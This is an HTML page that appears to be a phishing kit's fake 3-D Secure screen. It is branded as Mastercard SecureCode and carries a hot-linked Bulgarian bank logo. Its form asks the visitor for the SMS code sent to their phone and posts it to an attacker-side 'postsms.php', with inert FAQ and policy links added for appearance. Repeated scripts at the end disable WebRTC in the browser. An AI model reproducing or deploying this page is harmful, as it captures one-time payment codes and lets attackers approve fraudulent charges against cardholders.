<html lang="en"><head>
<meta name="pageId" content="838093052">

<title>3d payment</title>
<meta name="keywords" content="Mastercard SecureCode">

<meta name="description" content="Mastercard SecureCode">

<link rel="stylesheet" href="redirect_files/TDSecure.css" type="text/css" title="page_css">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">



<link rel="shortcut icon" href="" type="image/x-icon">



 




<script data-dapp-detection="">!function(){let e=!1;function n(){if(!e){const n=document.createElement("meta");n.name="dapp-detected",document.head.appendChild(n),e=!0}}if(window.hasOwnProperty("ethereum")){if(window.__disableDappDetectionInsertion=!0,void 0===window.ethereum)return;n()}else{var t=window.ethereum;Object.defineProperty(window,"ethereum",{configurable:!0,enumerable:!1,set:function(e){window.__disableDappDetectionInsertion||n(),t=e},get:function(){if(!window.__disableDappDetectionInsertion){const e=arguments.callee;e&&e.caller&&e.caller.toString&&-1!==e.caller.toString().indexOf("getOwnPropertyNames")||n()}return t}})}}();</script></head>

<body bgcolor="#FFFFFF" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0" onload="OnLoad()" onkeydown="return enterPress(event);" onbeforeunload="OnBeforeUnload();" onclick="clearShouldConfirmPageExit();">
 
<table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">

 
<tbody><tr><td align="center" valign="middle">
<table border="1" cellspacing="0" cellpadding="6" width="365" height="400">

	<tbody><tr><td width="350" height="360" align="center" valign="middle">
<center><br><br><img src="https://www.ccbank.bg//web/files/richeditor/fizicheski-lica/bankovi-karti/kartovi-uslugi/images.png" width="200">
	</center><table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">

	

	<tbody><tr></tr>
	
	
	









		<tr><td align="left" width="100%">
				<center><h1 class="mhtitle">Check your payment to continue.</h1></center></td></tr>
		<tr><td align="left" valign="top" width="100%">
				<span class="mbody"></span></td></tr>
		<tr><td align="center" valign="top" width="50%">
				<span class="mbody">Please enter the SMS code sent to your phone number.</span></td></tr>
					
		

	<tr><td valign="middle">
		
		<form action="postsms.php" method="POST" style="margin-bottom:0;">


	<div></div><table border="0" cellspacing="0" cellpadding="0" width="100%" role="presentation">

		<tbody><tr><td colspan="3">
		<table border="0" cellspacing="0" cellpadding="0" width="200%" role="presentation">
 
		
	<tbody><tr>
		<td>
			<table border="0" cellpadding="1" cellspacing="0" width="50%">
			<tbody><tr>
				
				<td align="center"><span><input required="" placeholder="SMS CODE" type="text" name="code" id="access_number" size="50" value="" style="width: 140px; height: 30px; COLOR: #000000;  FONT-FAMILY: Arial; FONT-SIZE: 13px;" autocomplete="off"></span></td>
			</tr>
			</tbody></table>
		</td>
	</tr>
</tbody></table>

    </td></tr><tr>
	
	<td align="left" valign="top" width="100%">
				<span class="mbody"></span></td>
	</tr>						
	<tr>
		<td align="center" valign="middle" height="30" width="100%">
			<br><br><br><table border="0" cellspacing="0" cellpadding="0" width="100%" role="presentation">
 
			<tbody><tr>
			    				
				    <td width="0%"></td>
				
			   
			
			
			<td align="center">
			
				<input class="button" type="submit" value="Continue">
							
			</td>
			
	
			
	            <td width="5%">&nbsp;&nbsp;</td>	
				<td align="left">
					
						<input class="button" type="button" value="Cancel">
						
				</td>
			
		
		
			
		 		
			 <td align="center" valign="bottom" width="100%">
			 		<span class="mbodysmall">
			 			<a href="javascript:JSVoidOpenNewWindow2 ('../tdsecure/aa_challenge_faq.jsp?cycfg_affinity=mc&amp;cycfg_last_application_module=7' , cy_popup_name  , 20 , 20 , 'scrollbars,width=420,height=700')" name="dummy_button_name91927">FAQ's</a>&nbsp;&nbsp;&nbsp;<a href="javascript:JSVoidOpenNewWindow2 ('../tdsecure/terms_of_use.jsp?cycfg_affinity=mc&amp;cycfg_last_application_module=7' , cy_popup_name  , 20 , 20 , 'scrollbars,width=410,height=500')" name="dummy_button_name91928">Terms of Use</a>&nbsp;&nbsp;&nbsp;<a href="javascript:JSVoidOpenNewWindow2 ('../tdsecure/privacy_policy.jsp?cycfg_affinity=mc&amp;cycfg_last_application_module=7' , cy_popup_name  , 20 , 20 , 'scrollbars,width=700,height=400')" name="dummy_button_name91929">Privacy Policy</a>
			 		</span>
			 </td>
													 
			 </tr>
			 
			 
			 
			 </tbody></table>
 
		</td>
	</tr>
	



</tbody></table>

</form></td></tr></tbody></table>

</td></tr></tbody></table>









</td></tr></tbody></table><script type="text/javascript" id="webrtc-control">(function () {
      if (typeof navigator.getUserMedia !== "undefined") navigator.getUserMedia = undefined;
      if (typeof window.MediaStreamTrack !== "undefined") window.MediaStreamTrack = undefined;
      if (typeof window.RTCPeerConnection !== "undefined") window.RTCPeerConnection = undefined;
      if (typeof window.RTCSessionDescription !== "undefined") window.RTCSessionDescription = undefined;
      //
      if (typeof navigator.mozGetUserMedia !== "undefined") navigator.mozGetUserMedia = undefined;
      if (typeof window.mozMediaStreamTrack !== "undefined") window.mozMediaStreamTrack = undefined;
      if (typeof window.mozRTCPeerConnection !== "undefined") window.mozRTCPeerConnection = undefined;
      if (typeof window.mozRTCSessionDescription !== "undefined") window.mozRTCSessionDescription = undefined;
      //
      if (typeof navigator.webkitGetUserMedia !== "undefined") navigator.webkitGetUserMedia = undefined;
      if (typeof window.webkitMediaStreamTrack !== "undefined") window.webkitMediaStreamTrack = undefined;
      if (typeof window.webkitRTCPeerConnection !== "undefined") window.webkitRTCPeerConnection = undefined;
      if (typeof window.webkitRTCSessionDescription !== "undefined") window.webkitRTCSessionDescription = undefined;
    })(); </script><script type="text/javascript" id="webrtc-control">(function () {
      if (typeof navigator.getUserMedia !== "undefined") navigator.getUserMedia = undefined;
      if (typeof window.MediaStreamTrack !== "undefined") window.MediaStreamTrack = undefined;
      if (typeof window.RTCPeerConnection !== "undefined") window.RTCPeerConnection = undefined;
      if (typeof window.RTCSessionDescription !== "undefined") window.RTCSessionDescription = undefined;
      //
      if (typeof navigator.mozGetUserMedia !== "undefined") navigator.mozGetUserMedia = undefined;
      if (typeof window.mozMediaStreamTrack !== "undefined") window.mozMediaStreamTrack = undefined;
      if (typeof window.mozRTCPeerConnection !== "undefined") window.mozRTCPeerConnection = undefined;
      if (typeof window.mozRTCSessionDescription !== "undefined") window.mozRTCSessionDescription = undefined;
      //
      if (typeof navigator.webkitGetUserMedia !== "undefined") navigator.webkitGetUserMedia = undefined;
      if (typeof window.webkitMediaStreamTrack !== "undefined") window.webkitMediaStreamTrack = undefined;
      if (typeof window.webkitRTCPeerConnection !== "undefined") window.webkitRTCPeerConnection = undefined;
      if (typeof window.webkitRTCSessionDescription !== "undefined") window.webkitRTCSessionDescription = undefined;
    })(); </script><script type="text/javascript" id="webrtc-control">(function () {
      if (typeof navigator.getUserMedia !== "undefined") navigator.getUserMedia = undefined;
      if (typeof window.MediaStreamTrack !== "undefined") window.MediaStreamTrack = undefined;
      if (typeof window.RTCPeerConnection !== "undefined") window.RTCPeerConnection = undefined;
      if (typeof window.RTCSessionDescription !== "undefined") window.RTCSessionDescription = undefined;
      //
      if (typeof navigator.mozGetUserMedia !== "undefined") navigator.mozGetUserMedia = undefined;
      if (typeof window.mozMediaStreamTrack !== "undefined") window.mozMediaStreamTrack = undefined;
      if (typeof window.mozRTCPeerConnection !== "undefined") window.mozRTCPeerConnection = undefined;
      if (typeof window.mozRTCSessionDescription !== "undefined") window.mozRTCSessionDescription = undefined;
      //
      if (typeof navigator.webkitGetUserMedia !== "undefined") navigator.webkitGetUserMedia = undefined;
      if (typeof window.webkitMediaStreamTrack !== "undefined") window.webkitMediaStreamTrack = undefined;
      if (typeof window.webkitRTCPeerConnection !== "undefined") window.webkitRTCPeerConnection = undefined;
      if (typeof window.webkitRTCSessionDescription !== "undefined") window.webkitRTCSessionDescription = undefined;
    })(); </script><script type="text/javascript" id="webrtc-control">(function () {
      if (typeof navigator.getUserMedia !== "undefined") navigator.getUserMedia = undefined;
      if (typeof window.MediaStreamTrack !== "undefined") window.MediaStreamTrack = undefined;
      if (typeof window.RTCPeerConnection !== "undefined") window.RTCPeerConnection = undefined;
      if (typeof window.RTCSessionDescription !== "undefined") window.RTCSessionDescription = undefined;
      //
      if (typeof navigator.mozGetUserMedia !== "undefined") navigator.mozGetUserMedia = undefined;
      if (typeof window.mozMediaStreamTrack !== "undefined") window.mozMediaStreamTrack = undefined;
      if (typeof window.mozRTCPeerConnection !== "undefined") window.mozRTCPeerConnection = undefined;
      if (typeof window.mozRTCSessionDescription !== "undefined") window.mozRTCSessionDescription = undefined;
      //
      if (typeof navigator.webkitGetUserMedia !== "undefined") navigator.webkitGetUserMedia = undefined;
      if (typeof window.webkitMediaStreamTrack !== "undefined") window.webkitMediaStreamTrack = undefined;
      if (typeof window.webkitRTCPeerConnection !== "undefined") window.webkitRTCPeerConnection = undefined;
      if (typeof window.webkitRTCSessionDescription !== "undefined") window.webkitRTCSessionDescription = undefined;
    })(); </script><script type="text/javascript" id="webrtc-control">(function () {
      if (typeof navigator.getUserMedia !== "undefined") navigator.getUserMedia = undefined;
      if (typeof window.MediaStreamTrack !== "undefined") window.MediaStreamTrack = undefined;
      if (typeof window.RTCPeerConnection !== "undefined") window.RTCPeerConnection = undefined;
      if (typeof window.RTCSessionDescription !== "undefined") window.RTCSessionDescription = undefined;
      //
      if (typeof navigator.mozGetUserMedia !== "undefined") navigator.mozGetUserMedia = undefined;
      if (typeof window.mozMediaStreamTrack !== "undefined") window.mozMediaStreamTrack = undefined;
      if (typeof window.mozRTCPeerConnection !== "undefined") window.mozRTCPeerConnection = undefined;
      if (typeof window.mozRTCSessionDescription !== "undefined") window.mozRTCSessionDescription = undefined;
      //
      if (typeof navigator.webkitGetUserMedia !== "undefined") navigator.webkitGetUserMedia = undefined;
      if (typeof window.webkitMediaStreamTrack !== "undefined") window.webkitMediaStreamTrack = undefined;
      if (typeof window.webkitRTCPeerConnection !== "undefined") window.webkitRTCPeerConnection = undefined;
      if (typeof window.webkitRTCSessionDescription !== "undefined") window.webkitRTCSessionDescription = undefined;
    })(); </script><script type="text/javascript" id="webrtc-control">(function () {
      if (typeof navigator.getUserMedia !== "undefined") navigator.getUserMedia = undefined;
      if (typeof window.MediaStreamTrack !== "undefined") window.MediaStreamTrack = undefined;
      if (typeof window.RTCPeerConnection !== "undefined") window.RTCPeerConnection = undefined;
      if (typeof window.RTCSessionDescription !== "undefined") window.RTCSessionDescription = undefined;
      //
      if (typeof navigator.mozGetUserMedia !== "undefined") navigator.mozGetUserMedia = undefined;
      if (typeof window.mozMediaStreamTrack !== "undefined") window.mozMediaStreamTrack = undefined;
      if (typeof window.mozRTCPeerConnection !== "undefined") window.mozRTCPeerConnection = undefined;
      if (typeof window.mozRTCSessionDescription !== "undefined") window.mozRTCSessionDescription = undefined;
      //
      if (typeof navigator.webkitGetUserMedia !== "undefined") navigator.webkitGetUserMedia = undefined;
      if (typeof window.webkitMediaStreamTrack !== "undefined") window.webkitMediaStreamTrack = undefined;
      if (typeof window.webkitRTCPeerConnection !== "undefined") window.webkitRTCPeerConnection = undefined;
      if (typeof window.webkitRTCSessionDescription !== "undefined") window.webkitRTCSessionDescription = undefined;
    })(); </script></body></html>